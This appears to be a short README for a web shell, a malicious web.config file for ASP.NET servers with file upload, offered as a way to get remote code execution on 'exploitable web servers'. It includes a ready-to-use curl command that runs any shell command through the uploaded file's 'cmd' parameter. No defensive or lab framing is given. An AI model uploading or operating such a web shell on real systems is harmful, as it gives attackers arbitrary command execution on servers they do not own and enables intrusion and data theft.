# webshell

This little web.config is a great resource for ASP.net web servers that you can upload files to.

The web.config gives you RCE on exploitable web servers.

The most functional method of using this for me has been with curl as such (any command you'd like to run comes after the 'cmd='):

curl http://0.0.0.0/upload_dir/web.config?cmd=dir
